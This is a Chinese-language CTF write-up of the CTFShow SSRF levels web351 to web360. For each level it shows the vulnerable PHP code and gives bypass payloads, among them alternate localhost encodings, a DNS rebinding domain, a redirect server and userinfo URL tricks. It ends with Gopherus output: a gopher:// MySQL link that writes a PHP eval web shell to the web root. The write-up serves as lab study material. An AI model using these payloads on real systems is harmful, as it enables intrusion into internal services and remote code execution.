# CTFSHOW-SSRF

[TOC]

---

## 题目

### web351

目录扫描发现存在flag.php文件，但是我们访问不了，

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?> 
```

![image-20250115155957402](https://gitee.com/bx33661/image/raw/master/path/image-20250115155957402.png)

这就是利用ssrf，直接传参

```http
url=127.0.0.1/flag.php
```



### web352

检测http，https，并且过滤127和localhost

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$url = $_POST['url'];
$x = parse_url($url);

if ($x['scheme'] === 'http' || $x['scheme'] === 'https') {
    if (!preg_match('/localhost|127\.0\.0/', $url)) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $result = curl_exec($ch);
        curl_close($ch);
        echo $result;
    } else {
        die('hacker');
    }
} else {
    die('hacker');
}
?>
```

过滤手段

```ABAP
url=http://0/flag.php 
url=http://0.0.0.0/flag.php
url=http://127.1/flag.php
url=http://2130706433/flag.php #十进制
url=http://017700000001/flag.php #八进制
url=http://0b1111111000000000000000000000001/flag.php #二进制
url=http://0x7f.0.0.1/flag.php #十六进制
url=http://0177.0.0.1/flag.php #八进制另类
url=http://localhost/flag.php
url=http://127.127.127.127/flag.php
url=http://[::]:80/flag.php #不太理解，而且貌似不行？
127。0。0。1 >>> 127.0.0.1
```



### web353

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|127\.0\.|\。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> 
```

多过滤了几个，继续尝试上面方法



### web354

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
if(!preg_match('/localhost|1|0|。/i', $url)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> 
```

把0和1都办了，我们可以找一个dns指向127.0.0.1的绕过

满足解析到127.0.0.1的合适域名即可

```(空)
url=http://sudo.cc/flag.php
```



### web355

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$host=$x['host'];
if((strlen($host)<=5)){
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
}
else{
    die('hacker');
}
}
else{
    die('hacker');
}
?> hacker
```

限制host的内容＜5个字符

`url=http://127.1/flag.php`

`url=http://0/flag.php `



### web356

用上一题的`//0/`



### web357

#### 题目代码

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if($x['scheme']==='http'||$x['scheme']==='https'){
$ip = gethostbyname($x['host']);
echo '</br>'.$ip.'</br>';
if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('ip!');
}


echo file_get_contents($_POST['url']);
}
else{
    die('scheme');
}
?> 
```

#### 代码解析

1. **`parse_url()`**:

   - 解析 URL，返回一个包含协议、主机名、路径等信息的数组。

   - 例如，`parse_url('http://example.com/path')` 返回：

     ```php
     array(
         'scheme' => 'http',
         'host' => 'example.com',
         'path' => '/path'
     )
     ```

2. **协议验证**:

   - 只允许 `http` 和 `https` 协议，其他协议（如 `file://`、`ftp://`）会被拒绝。

3. **`gethostbyname()`**:

   - 将主机名解析为 IP 地址。
   - 例如，`gethostbyname('example.com')` 返回 `93.184.216.34`。

4. **IP 地址验证**:

   - 使用 `filter_var()` 检查 IP 是否在私有或保留范围内。
   - `FILTER_FLAG_NO_PRIV_RANGE`: 禁止私有 IP 范围（如 `10.0.0.0/8`、`172.16.0.0/12`、`192.168.0.0/16`）。
   - `FILTER_FLAG_NO_RES_RANGE`: 禁止保留 IP 范围（如 `0.0.0.0/8`、`127.0.0.0/8`）。

5. **`file_get_contents()`**:

   - 获取 URL 的内容并输出。
   - 如果 URL 无效或无法访问，可能会导致警告或错误



#### 解法

在自己服务器上搭建一个,php--->ssrf.php

```php
<?php
header("Location:http://127.0.0.1/flag.php");
```

![image-20250115180504725](https://gitee.com/bx33661/image/raw/master/path/image-20250115180504725.png)



### web358

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$url=$_POST['url'];
$x=parse_url($url);
if(preg_match('/^http:\/\/ctf\..*show$/i',$url)){
    echo file_get_contents($url);
}
```



Payload:

```(空)
url=http://ctf.@127.0.0.1/flag.php?show
```



这里列举一下url解析规则

#### url解析规则

URL（统一资源定位符）的解析规则是由标准定义的，通常遵循以下格式：

```
scheme://[user:password@]host[:port][/path][?query][#fragment]
```

每个部分的含义如下：

1. **Scheme（协议）**

   - 表示访问资源所使用的协议，例如 `http`、`https`、`ftp` 等。
   - 必须以 `://` 结尾。
   - 示例：
     ```
     http://example.com
     https://example.com
     ```

2. **Authority（授权部分）**

   - 授权部分包括以下内容：
     - **User Information（用户信息）**：
       - 可选，格式为 `username:password@`。
       - 示例：
         ```
         http://user:pass@example.com
         ```
     - **Host（主机）**：
       - 表示服务器的域名或 IP 地址。
       - 示例：
         ```
         example.com
         127.0.0.1
         ```
     - **Port（端口）**：
       - 可选，表示服务器的端口号。
       - 默认端口根据协议不同而不同（如 HTTP 默认是 80，HTTPS 默认是 443）。
       - 示例：
         ```
         example.com:8080
         ```

3. **Path（路径）**

   - 表示服务器上资源的路径。
   - 以 `/` 开头。
   - 示例：
     ```
     /path/to/resource
     ```

4. **Query（查询参数）**

   - 可选，表示传递给服务器的参数。
   - 以 `?` 开头，参数之间用 `&` 分隔。
   - 示例：
     ```
     ?name=value&key=value
     ```

5. **Fragment（片段）**

   - 可选，表示资源内部的某个部分（如页面内的锚点）。
   - 以 `#` 开头。
   - 示例：
     ```
     #section1
     ```

完整 URL 示例

```
https://user:pass@example.com:8080/path/to/resource?name=value&key=value#section1
```

解析后：
- **Scheme**: `https`
- **User Information**: `user:pass`
- **Host**: `example.com`
- **Port**: `8080`
- **Path**: `/path/to/resource`
- **Query**: `name=value&key=value`
- **Fragment**: `section1`

URL 解析的特殊情况

1. **相对 URL**：
   - 如果 URL 没有协议和主机部分，则称为相对 URL。
   - 示例：
     ```
     /path/to/resource
     ```

2. **特殊字符**：
   - URL 中的某些字符需要编码（如空格编码为 `%20`）。
   - 示例：
     ```
     https://example.com/path%20to%20resource
     ```

3. **IPv6 地址**：
   - IPv6 地址需要用 `[]` 包裹。
   - 示例：
     ```
     http://[::1]:8080/
     ```

4. **空用户名或密码**：
   - 如果用户名或密码为空，可以只写 `@`。
   - 示例：
     ```
     http://@example.com
     ```

PHP 中的 `parse_url` 函数

PHP 提供了 `parse_url` 函数来解析 URL，返回一个关联数组，包含以下键：
- `scheme`：协议
- `host`：主机
- `port`：端口
- `user`：用户名
- `pass`：密码
- `path`：路径
- `query`：查询参数
- `fragment`：片段

示例：
```php
$url = "https://user:pass@example.com:8080/path/to/resource?name=value#section1";
print_r(parse_url($url));
```

输出：
```php
Array
(
    [scheme] => https
    [host] => example.com
    [port] => 8080
    [user] => user
    [pass] => pass
    [path] => /path/to/resource
    [query] => name=value
    [fragment] => section1
)
```





### web359-360

```(空)
┌──(root㉿kali)-[/home/bx/桌面/Gopherus]
└─# python2 gopherus.py --exploit mysql

                                                                             
  ________              .__                                                  
 /  _____/  ____ ______ |  |__   ___________ __ __  ______                   
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/                   
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \                    
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >                   
        \/       |__|        \/     \/                 \/                    
                                                                             
                author: $_SpyD3r_$                                           
                                                                             
For making it work username should not be password protected!!!

Give MySQL username: root                                                    
Give query to execute: select "<?php @eval($_POST[1]);?>" into outfile "/var/www/html/1.php"

Your gopher link is ready to do SSRF :                                       
                                                                             
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%40%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

